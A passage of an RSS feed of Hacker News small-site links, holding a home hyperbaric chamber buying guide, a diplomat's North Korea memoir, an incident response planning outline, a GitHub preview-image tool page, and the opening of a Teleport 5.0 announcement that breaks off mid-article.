https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--660x1536.png 660w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--800x1863.png 800w"> </p> </div> </div> <div data-id="1813835f" data-element_type="widget" data-widget_type="theme-post-content.default"> <div>   <p>The 5 best home hyperbaric chambers aka mild hyperbaric chambers.&nbsp; With the popularity growing among home hyperbaric use.&nbsp; This guide will help you choose the best hyperbaric chamber for your home.&nbsp; All of the chambers are not rated is best to least but all 5 equally the only difference being price and shape.&nbsp; I have chose these chamber based on the needs of the customer and budget conscious.</p> <p><a href="https://atlantahyperbariccenter.com/wp-content/uploads/2019/07/thumbnail-6.jpeg"><img alt="Used Flexi Lite" width="1080" height="810" sizes="(max-width: 1080px) 100vw, 1080px" nitro-lazy-srcset="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6.jpeg 1080w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-300x225.jpeg 300w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-768x576.jpeg 768w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-1024x768.jpeg 1024w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-800x600.jpeg 800w" nitro-lazy-src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6.jpeg" nitro-lazy-empty="" id="MTQ3ODo4MDg=-1" src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6.jpeg" srcset="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6.jpeg 1080w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-300x225.jpeg 300w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-768x576.jpeg 768w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-1024x768.jpeg 1024w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-800x600.jpeg 800w"></a></p> <p>If you are looking for a home oxygen chamber for your home give us a call. Owning your own chamber will save you time and money.</p>  <h2>The 5 best home hyperbaric chambers</h2>  <ol> <li><a href="https://atlantahyperbariccenter.com/26-shallow-dive-hyperbaric-chamber/"><strong>26â€³&nbsp; Hyperbaric chamber</strong> </a>â€“ $3,800 This is the excellent entry chamber.&nbsp; 26â€³ diameter and 7â€² long.&nbsp; It is whit bright and has two zippers and buckles for extra support.&nbsp; This chamber is perfect a single (person woman or small male). The chamber is one of the safest chambers with two open valves, two compressors, and surge alarm.</li> <li><a href="https://atlantahyperbariccenter.com/27-portable-hyperbaric-chamber/"><strong>27â€³ Hyperbaric Chamber</strong></a> â€“ $3695 The another great entry level chamber.&nbsp; This chamber only comes with one pump but you can add another to your order with ease.&nbsp; This chamber is 27â€³&nbsp; diameter and around 7â€² long.&nbsp; The chamber and a external frame, metal fixtures, think vinyl and three zippers.</li> <li><a href="https://atlantahyperbariccenter.com/33-dive-mild-hyperbaric-chamber-for-sale/"><strong>33â€³ Hyperbaric Chamber</strong> </a>â€“ $8,800 for this mid range home hyperbaric chamber.&nbsp; 33â€³ diameter and 7 foot long.&nbsp; This chamber can fit easily a parent and child or two adult.&nbsp; This chamber comes with two pumps and external frame with foam mattress.</li> <li><a href="https://atlantahyperbariccenter.com/demo-34-hyperbaric-chamber/"><strong>34â€³ Hyperbaric Chamber</strong></a> â€“ $6895 This chamber comes with one pump but you can upgrade to two (recommended).&nbsp; 34â€³ diameter and 8â€² long.&nbsp; This chamber has three windows and the front facing windows in made of plexiglass that does not satin, fade or dry rot.&nbsp; This chamber can be used for home or professional use.</li> <li><a href="https://atlantahyperbariccenter.com/60-vertical-hyperbaric-chamber-bundle/"><strong>60â€³ Vertical Hyperbaric Chamber</strong></a> â€“ $14,995 This is the largest home chamber on the market and by far my favorite.&nbsp; I have owned several of these chambers and I personally have one of these in my master bedroom. .&nbsp; I love it.&nbsp; The footprint is not bad only 6ft. square do you need for the space.&nbsp; You can easily fit a parent and child or two adults in this awesome chamber.&nbsp; The versatility is pulse you can sit in a chair, relax in a bean bag or lay down.</li> </ol> <p>I hope this article helps you choose the best home hyperbaric chamber.&nbsp; Please share if you think this article could help someone choose the best hyperbaric chamber.&nbsp; Check out my Youtube channel for more great hyperbaric videos.&nbsp; If you are interested in a private home hyperbaric chamber please feel free to call me or my team 770-948-4511. Thank you for taking the time for reading my article.</p> <p>Yours in health</p> <p>Dr. Louis Hilliard DC</p> <p><a href="https://atlantahyperbariccenter.com/why-buy-a-hyperbaric-chamber-from-us/" target="_blank" rel="noopener noreferrer">Why buy a hyperbaric chamber from Us</a></p> <p><a href="https://atlantahyperbariccenter.com/buy-a-hyperbaric-chamber/" target="_blank" rel="noopener noreferrer">Buy A Hyperbaric Chamber</a></p> <p><a href="https://atlantahyperbariccenter.com/how-to-buy-a-hyperbaric-chamber/" target="_blank" rel="noopener noreferrer">How To Buy a Hyperbaric Chamber</a></p> <p><a href="https://atlantahyperbariccenter.com/home-hyperbaric-chambers/" target="_blank" rel="noopener noreferrer">Home Hyperbaric Chamber</a></p>  </div> </div>  <div data-id="75cc0d4e" data-element_type="widget" data-widget_type="author-box.default"> <div> <div> <p><img alt="Doctor Lou" nitro-lazy-src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/desktop/optimized/rev-6136258/avatar/5841d7da8b6c7d486226c9358f93fc5a.93e242e68dccd9519161ce66e0681872" nitro-lazy-empty="" id="MTUwODoxMTk=-1" src="data:image/svg+xml;nitro-empty-id=MTUwODoxMTk=-1;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzAwIDMwMCIgd2lkdGg9IjMwMCIgaGVpZ2h0PSIzMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PC9zdmc+"> </p> <div> <p> <h4>Doctor Lou</h4> </p> <p> Hello, my name is Dr. Louis Hilliard and I am the owned of Atlanta Hyperbaric Center and Georgia Licensed Chiropractor. I opened one of the first private hyperbaric centers in 2006 and I have been helped thousands of people with their hyperbaric needs. </p> </div> </div> </div> </div>   </div> </div> </div>  </div> </div> </section> </div> </div> </main> </div> </div> </div></div>]]>
            </description>
            <link>https://atlantahyperbariccenter.com/the-5-best-home-hyperbaric-chambers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151375</guid>
            <pubDate>Thu, 19 Nov 2020 16:51:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[British Diplomat Works with North Korean Military]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25151330">thread link</a>) | @Hansig_jw
<br/>
November 19, 2020 | https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/ | <a href="https://web.archive.org/web/*/https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><div id="gallery-1"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/thumbnail-1/#main"><img width="400" height="311" src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" alt="Flt Lt Hinton North Korea" aria-describedby="gallery-1-980" data-lazy-srcset="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?w=400&amp;ssl=1 400w, https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?resize=300%2C233&amp;ssl=1 300w" data-lazy-sizes="(max-width: 400px) 100vw, 400px" data-lazy-src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-1-980"> Flt Lt Hinton with USAF colleagues -Photo David Hinton</figcaption></figure></div><p>To tell people that a<strong> British diplomat</strong> had a close working relationship with the <strong>North Korean military</strong> for a 6 month period would in itself raise more than a few eyebrows. Working for 3 years in North Korea was on the one hand a time of frustration and on the other a time of discovery in this fascinating yet enigmatic country. Butting heads on a daily basis with the stifling North Korean bureaucracy was always a battle, but occasionally there was a glimmer of achievement and sometimes from the most unlikeliest of sources.</p><div id="gallery-2"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/download-4/#main"><img width="510" height="339" src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/download-4.jpg?fit=510%2C339&amp;ssl=1&amp;is-pending-load=1" alt="" aria-describedby="gallery-2-1251" data-lazy-srcset="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/download-4.jpg?w=510&amp;ssl=1 510w, https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/download-4.jpg?resize=300%2C199&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/download-4.jpg?fit=510%2C339&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-2-1251"> British Embassy Pyongyang, North Korea</figcaption></figure></div><p>In early 2004, I was contacted at the embassy in<strong> Pyongyang</strong> by the brother of an RAF pilot who had been shot down in 1952 over North Korea during the Korean war. He said he had full details of the shoot down supplied by eyewitness United States Air Force (USAF) pilots and map coordinates of the site of the crash (which he sent to me) and wished to visit the area to discover the fate of his brother.</p><p>The background was that the pilot, Flt Lt Desmond Hinton, who received the Distinguished Flying Cross in World War II for shooting down two Japanese fighters had bailed out of his burning F84e Thunderjet whilst carrying out a strafing mission north east of Pyongyang on 2 January 1952. At the time, Flt Lt Hinton was one of a number of RAF pilots who were attached to and flying with the USAF. Despite enquiries after the war and with no further information as to his fate forthcoming, Flt Lt Hinton was subsequently officially listed as missing in action.</p><p>This seemed a daunting request, but nevertheless I submitted it to the North Koreans and having gone through the usual long and tortuous channels I was surprised to receive an invitation to a meeting with senior North Korean military officers to discuss the request. Soon after therefore, it was with some degree of trepidation that I and my interpreter set off to meet these senior officers at a large military base on the outskirts of Pyongyang.</p><p>Driving into the base, we stopped at the entrance guard house and I was told to leave my diplomatic vehicle parked there. Then my interpreter and I climbed into a small military vehicle with an officer who my interpreter told me would be our liaison officer for the visit.</p><p>The base was huge. We drove past ranks of tanks, armoured vehicles and lorries which appeared to be in pristine (and highly polished) condition. I did learn later that this base was one of several in the Pyongyang garrison that supplied vehicles for the massed televised parades.</p><p>A short while later we pulled up outside a large office building. Our liaison officer led us in and up the stairs to a large conference room where sat several high ranking officers. There were also some junior officers milling around as well as a couple of shady looking civilians who never took their eyes off me for the whole meeting. Very disconcerting.</p><div id="gallery-3"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/dscn0156/#main"><img width="510" height="383" src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" alt="My Diplomatic Life" aria-describedby="gallery-3-1253" data-lazy-srcset="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?w=510&amp;ssl=1 510w, https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?resize=300%2C225&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-3-1253"> Social Meeting with North Korean Colonel</figcaption></figure></div><p>Some commands were rapped out in Korean and everyone sat down. I then outlined my request to them and also provided them with all the relevant information that had been sent to me from the UK. They listened politely. They were very courteous and the atmosphere was more relaxed than I had anticipated. When I had finished my spiel and before they responded to my request, tea was brought in and they all lit up cigarettes. As I drank my tea, they all began a long conversation amongst themselves.</p><p>Finally, they said they would investigate this case and get back in touch. So thinking that this was an end to the proceedings, I stood up preparing to leave, but surprisingly no, it was not quite the end. They invited me to have lunch with them, which took me completely off guard.</p><p>Before I could respond, another command was rapped out and a series of orderlies wheeled in trollies containing a cold buffet and drink. The buffet was well prepared but the only downside was at the end of the meeting there were several toasts which meant imbibing several shots of the lethal North Korean Soju the after effects of which I did in due course suffer!</p><p>So the meeting finally came to an end. I thought that after this first meeting, that would be the end of it. I would get the usual reply back saying this request was not possible to facilitate. The Korean War was something that the North Koreans revered. Museums full of captured allied equipment, films, memorials, statues and posters depicting their glorious victory abounded everywhere. So requesting assistance in finding a hated enemy, albeit a fallen one, was perhaps a request too far.</p><div id="gallery-4"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/dscn0169-1/#main"><img width="510" height="383" src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" alt="North Korea" aria-describedby="gallery-4-1254" data-lazy-srcset="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?w=510&amp;ssl=1 510w, https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?resize=300%2C225&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-4-1254"> North Korea</figcaption></figure></div><p>But surprisingly, no.</p><p>Against all expectations, they did get back to me shortly afterwards with some quite startling news. Based on the information I had given them, they had identified the crash site which was close to a village called Kuso-ri/Gueso-ri situated near to what is currently the main airport for Pyongyang.</p><p>They had spoken with villagers including two elders who had witnessed the shoot down. Flt Lt Hinton had indeed ejected but his parachute failed and he was killed on impact. The villagers had then interred him in an unmarked grave in a field adjacent to the village. This spot had been identified and human bones and fragments of uniform and aircraft were also uncovered. This scenario is somewhat similar to my previous post <a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF PilotÃ¢â‚¬â„¢s Secret Grave Discovered In Albania</a></p><p>This news then led over the next six months to a long series of meetings, usually weekly either at Army HQ in Pyongyang, the crash site or at a military base on the outskirts of the city chaired on the military side by Senior Colonel Kwak Chol-hui who was to be my main point of contact for this project. I am glad to report that the two shady civilians from our first meeting never did make a reappearance.</p><p>The Colonel who would later go on to be promoted to Major General was responsible throughout the negotiations for arranging visits to the site, meetings with the two surviving eyewitnesses and agreeing that Flt Lt Hintonâ€™s brother would be fast tracked for a visa and allowed to visit the DPRK site to pay his final respects to his brother.</p><p>True to their word, Flt Lt Hintonâ€™s brother was granted his visa and permitted to visit the village. At a meeting we had with the military, he was offered the choice of having his brotherâ€™s remains repatriated to the south via Panmunjon or re-buried on the outskirts of the village. He chose the latter. Therefore, the military re-buried his remains in a properly marked grave and on the final day of his visit, he was part of a small, brief ceremony attended by members of the British Embassy, North Korean military and villagers.</p><p>Despite my requests, the North Koreans had refused to allow me to obtain a properly inscribed headstone from the Commonwealth War Graves Commission, so a simple marker was used instead. Overall, it was a small victory but did give some form of closure to the family of Flt Lt Hinton.</p><p>As mentioned above, I met Colonel Kwak Chol-hui (pictured above with me at a Queens Birthday Party celebration in Pyongyang) and his team on many occasions over that 6 month period. As well as working on the Hinton project, he also eased the process of enabling me to take the very rare numbers of visitors we got down to the DMZ at Panmunjon as part of their â€œNorth Korean experienceâ€. The other was the USS Pueblo where the military arranged private tours for me (Pueblo post to follow).</p><p>At Panmunjon, when I took visitors down to view the DMZ, we were always hosted by the military who would lay on briefings and guides for our visitors as well as a lunch afterwards. I could always see the look of bewilderment on the faces of the South Korean border guards and US military standing a few feet away on the southern side of the demarcation line wondering who these foreigners were on the other side looking a tad too cosy with North Korean officers!</p><p><b><i>*All of the above pre-supposes that this was the happy ending and finality for everyone involved. However, this was not to be the case as several years later a cruel deception was exposed, which I will be writing about shortly*</i></b></p><div heateor-sss-data-href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/"><p>Spread the love</p><ul><li><a data-pin-lang="en_US" href="https://www.pinterest.com/pin/create/button/?url=https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/" data-pin-count="false" data-pin-do="buttonPin" data-pin-config="beside"><img src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845" data-recalc-dims="1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845"></a></li></ul></div></div></div>]]>
            </description>
            <link>https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151330</guid>
            <pubDate>Thu, 19 Nov 2020 16:47:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to create Incident Response plan for security teams?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151319">thread link</a>) | @gunal2
<br/>
November 19, 2020 | https://letsdefend.io/blog/how-to-create-incident-response-plan/?q=hackernews | <a href="https://web.archive.org/web/*/https://letsdefend.io/blog/how-to-create-incident-response-plan/?q=hackernews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<h2>What is incident response?</h2>



<p>Incident response is an approach to managing a security incident process. An incident response plan is needed to approach security incidents systematically. A successful incident response plan includes the following 6 stages:</p>



<p>1- Preparation</p>



<p>2- Identification</p>



<p>3- Scope</p>



<p>4- Eradication</p>



<p>5- Recovery</p>



<p>6- Lessons Learned</p>



<p>If you want to practice about incident response, you can use our blue team training platform <a aria-label="undefined (opens in a new tab)" href="https://letsdefend.io/" target="_blank" rel="noreferrer noopener">LetsDefend </a>for free.</p>



<h3>1- Preparation</h3>



<p><strong>Creating a Central Registration System</strong></p>



<p>It is important in terms of saving time that all data can be examined from a single point with a central log collection system that can manage large files.</p>



<p><strong>Time Synchronization</strong></p>



<p>Enabling NTP on all devices in the network is important for matching the time information of the logs collected.</p>



<p><strong>User Account Management</strong></p>



<p>The fact that the user names of different accounts belonging to personnel are the same and different from other personnel makes it easy to monitor user activities in the event of an event.</p>



<p><strong>Management of System and Service Accounts</strong></p>



<p>The administrators of the services and systems used should be appointed and a document should be created on how to reach these managers if needed.</p>



<p><strong>Asset Management</strong></p>



<p>Instant access to information such as devices, operating systems, patch versions, and critical status should be available.</p>



<p><strong>Secure Communication</strong></p>



<p>If necessary, the team may need to communicate independently of the internal network, for such cases mobile phone or secondary emails can be used.</p>



<p><strong>Legal Transactions</strong></p>



<p>The method of who will initiate the judicial process and in which situations should be determined before the incident occurs.</p>



<h3>2- Identification</h3>



<p><strong>Review</strong></p>



<p>For a potential suspicious incident, preliminary information about the incident should be gathered. Then it must be decided whether the situation is a suspicious event or not.</p>



<p><strong>Assignment</strong></p>



<p>The first person to examine the incident must be determined. The person should take notes about the review.</p>



<p><strong>Using the Checklist</strong></p>



<p>There should be checklists for the analysis to be made in order to ensure consistent responses to incidents.</p>



<h3>3- Scope</h3>



<p><strong>Characterize the event</strong></p>



<p>Since determining the event will determine the actions to be taken, it is important to determine the type of the incoming event. EX: DDoS, malware infection, data leak â€¦</p>



<p><strong>Taking Action</strong></p>



<p>Action should be taken according to the technique used to intercept the attackerâ€™s method quickly. If there is an account that it has captured, simple measures such as account deactivation and IP blocking should be done quickly.</p>



<p><strong>Data collecting</strong></p>



<p>The image of the volatile memory along with the firewall, network traffic and other logs will be required for the investigation.</p>



<p><strong>Isolation</strong></p>



<p>Unplugging the compromised system&nbsp; could be a solution, isolating it is a more viable solution.</p>



<p>After the systems affected by the incident are determined, the possibility of the attackerâ€™s spread in the network is cut and volatile information is collected, the next step can be passed.</p>



<h3>4- Eradication</h3>



<p><strong>Identifying the Root Cause</strong></p>



<p>With the information obtained in the 2nd and 3rd stages, the root cause of the event should be determined. The attacker must then be completely kick out.</p>



<p><strong>Determining Rootkit Potential</strong></p>



<p>If rootkits are suspected in the system, the disk should be cleaned and a clean backup installed. After the installation, the latest updates of the existing applications and systems should be installed.</p>



<p><strong>Improve Defense</strong></p>



<p>Operating systems, applications used, network, DMZ etc. The deficiencies of defense in areas should be determined and work should be done on how to make improvement.</p>



<p><strong>Vulnerability Scan</strong></p>



<p>Potential attack points on networks and systems should be identified and corrected by performing vulnerability scans.</p>



<p>When the necessary arrangements are prepared to prevent the event from recurring, the recovery phase can be started.</p>



<h3>5- Recovery</h3>



<p><strong>Verification</strong></p>



<p>Verify that logging, systems, applications, databases, and other operations work correctly.</p>



<p><strong>Restore</strong></p>



<p>At this stage, the restore operation is coordinated.</p>



<p><strong>Monitoring</strong></p>



<p>Systems should be monitored for recurring events.</p>



<p>When there is no repetitive harmful situation or unusual activity, the next step is taken.</p>



<h3>6- Lessons Learned</h3>



<p><strong>Writing a Follow-up Report</strong></p>



<p>The report includes the examinations with the expert and the executive, the stages of good and bad working in the intervention plan, and the recommendations regarding the process. The report should be written in a way that the manager is sure that the event has been closed.</p>



<p><strong>References</strong></p>



<ul><li><a href="https://www.cmu.edu/iso/governance/procedures/docs/incidentresponseplan1.0.pdf">https://www.cmu.edu/iso/governance/procedures/docs/incidentresponseplan1.0.pdf</a></li><li>Blue Team Handbook: Incident Response Edition</li></ul>





		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://letsdefend.io/blog/how-to-create-incident-response-plan/?q=hackernews</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151319</guid>
            <pubDate>Thu, 19 Nov 2020 16:46:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Open graph image generator for your GitHub repositories]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25151272">thread link</a>) | @joemasilotti
<br/>
November 19, 2020 | https://www.mugshotbot.com/github | <a href="https://web.archive.org/web/*/https://www.mugshotbot.com/github">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div data-controller="customize"><div data-target="customize.error"><div><div><div><div><p>Something went wrong, please try again.</p></div></div></div></div></div><div><div><div><h3>GitHub social previews</h3><p>Create unique social preview images for your GitHub repositories. No design tools or code needed.</p></div><div><form data-target="customize.form" enctype="multipart/form-data" action="github.json" accept-charset="UTF-8" data-remote="true" method="post"><div><fieldset><label for="mugshot_url"><p>GitHub repository</p><p>What repo are you creating a social preview for?</p></label></fieldset><hr><fieldset><legend>Theme</legend><p>The overall appearance and layout of your link preview.</p></fieldset></div></form></div></div><div><div data-target="customize.preview"><p>Your GitHub social preview</p><div><div><div><p>Source for masilotti.com, built with Jekyll and Tailwind CSS.</p><div><p><img src="https://avatars3.githubusercontent.com/u/2092156?v=4"></p><div><p>Joe Masilotti</p><p>joemasilotti</p></div></div></div></div></div><div><div><div><div><div><div><p>Step 2</p><p>Share your repository</p></div><p>When you share a link to your repository this image will be used automatically.</p></div><a target="_blank" href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fgithub.com%2Fjoemasilotti%2Fmasilotti.com&amp;via=TheMugshotBot"><svg viewBox="0,0,20,20" fill="currentColor">
  <path d="M6.29 18.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0020 3.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.073 4.073 0 01.8 7.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 010 16.407a11.616 11.616 0 006.29 1.84"></path>
</svg>
Tweet</a></div></div></div></div></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.mugshotbot.com/github</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151272</guid>
            <pubDate>Thu, 19 Nov 2020 16:42:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Announcing Teleport 5.0 - Unified Access Plane and Application Access]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151232">thread link</a>) | @twakefield
<br/>
November 19, 2020 | https://goteleport.com/blog/application-access-announcement/ | <a href="https://web.archive.org/web/*/https://goteleport.com/blog/application-access-announcement/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      <a href="https://goteleport.com/blog/index.xml"><i></i></a>
      
      

        

<p><img src="https://goteleport.com/blog/images/2020/application-access-announcement-header.png" width="100%" alt="Teleport 5.0 application access announcement"></p>

<h2 id="introduction">Introduction</h2>

<p>Today, we are announcing the availability of Teleport 5.0. This is a major release for the project with numerous improvements and new features, but the hallmark capability of this version is the <a href="https://goteleport.com/teleport/">Unified Access Plane</a> and <a href="https://goteleport.com/teleport/application/">Application Access</a> for Developers.</p>

<p>For those unfamiliar with Teleport, it is an open source project for giving developers secure remote access to everything they need. It started as a replacement for OpenSSH, then added Kubernetes access, and today weâ€™re adding HTTPS as another protocol.</p>

<h2 id="application-access-for-developers">Application Access for Developers</h2>

<p>Do you have internal dashboards running inside your production or staging environments? Perhaps a couple of Jenkins servers, maybe a Kubernetes web UI, or other tools accessible via a browser? The old school method of accessing them was setting up a VPN, with extra points for configuring each of those apps to authenticate via some sort of a directory.</p>

<p>A better method is to embrace the <a href="https://goteleport.com/blog/vpns-and-zero-trust-thoughts-on-the-evolving-nature-of-remote-access/">Zero Trust</a> principle and expose all of your internal application endpoints to the internet with proper identity-based authentication with MFA. This creates work: getting a public IP, configuring DNS, maintaining X.509 certificates, setting up SAML integrations, etc. Just maintaining the inventory of all available HTTPS endpoints is work. Setting this up to qualify a SOC2, PCI or FedRAMP compliance is also work, and keeping your setup this way is a tiny bit of extra never-ending work.</p>

<p>This isnâ€™t rocket science, but we believe it must not be something that you should be spending your time on. Besides, if the operational costs of securely exposing another internal tool to the team was zero, we would all enjoy more tools.</p>

<p>Consider another use case: a web application running behind NAT on a third party network. To make it entertaining, think of a web app running on a self-driving vehicle with an ever-changing IP address. If you ship devices with web dashboards to be deployed inside customer networks, how do you access them from the outside?</p>

<p>This is why weâ€™ve added Application Access to Teleport 5.0. It allows users to visit the Teleport proxy in a browser and see a live inventory of applications running anywhere in the world. Each web application is just an HTTPS URL provided by Teleport, so you can have:</p>

<ul>
<li><a href="https://jenkins.proxy.example.com/">https://jenkins.proxy.example.com</a></li>
<li><a href="https://grafana.proxy.example.com/">https://grafana.proxy.example.com</a></li>
<li><a href="https://your-own-app.example.com/">https://your-own-app.example.com</a></li>
</ul>

<p>â€¦and more. An application can be added or removed with just a couple of clicks. It can even be completely automated. Hereâ€™s how it looks in the Web UI:

<video autoplay="" loop="" muted="" playsinline="">
  <source src="https://goteleport.com/blog/images/2020/k8s-taa.mp4" type="video/mp4">
  <source src="https://goteleport.com/blog/images/2020/k8s-taa.webm" type="video/webm">
Your browser does not support the video tag.
</video>
</p>

<h2 id="how-does-application-access-work">How does Application Access Work?</h2>

<p>Teleport, for those who have never used it, is a single dependency-free binary which can run as a Linux daemon or can be deployed as a Kubernetes pod. Not surprisingly, this binary is called <code>teleport</code>.</p>

